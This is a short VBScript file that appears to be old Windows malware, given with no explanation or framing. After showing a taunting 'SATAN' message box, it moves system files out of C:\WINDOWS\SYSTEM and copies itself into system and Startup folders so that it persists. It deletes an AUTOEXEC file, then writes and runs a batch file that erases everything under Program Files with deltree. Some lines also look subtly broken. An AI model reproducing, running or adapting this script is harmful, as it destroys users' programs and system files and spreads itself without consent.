helvete=MsgBox("Be Afraid! Be Very Very Afraid!", 16, "This is SATAN from hell!")
Dim fear, hell, hellpath 
hellpath = "c:\WINDOWS\MyFolder" 
set fear=CreateObject("Scripting.FileSystemObject") 
If Not fear.FolderExists(hellpath) Then 
Set hell = fear.CreateFolder(hellpath) 
dim fear
set fear=CreateObject("Scripting.FileSystemObject")
fear.MoveFile "C:\WINDOWS\SYSTEM\*.*","C:\WINDOWS\MyFolder\"
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM\fun.vbs", True
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM32\fun.vbs", 
True
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\Start Menu\Programs\StartUp\fun.vbs", True
dim devil
Set devil = CreateObject("Scripting.FileSystemObject")
devil.DeleteFile "C:\WINDOWS\COMMAND\EBD\AUTOEXEC",True
Set devil = Nothing
Dim shell, msc, batch, fso
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\fun.vbs", True
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\WINDOWS\COMMAND\EBD\AUTOEXEC.bat")
msc.TargetPath=shell.ExpandEnvironment("C:\fun.vbs")
msc.WindowStyle=4
msc.Save
set batch=fso.CreateTextFile("C:\lnk.bat")
batch.WriteLine "@echo off"
batch.WriteLine "cls"
batch.WriteLine "deltree C:\Program Files\*.*"
batch.Close
shell.Run  "C:\lnk.bat"
end if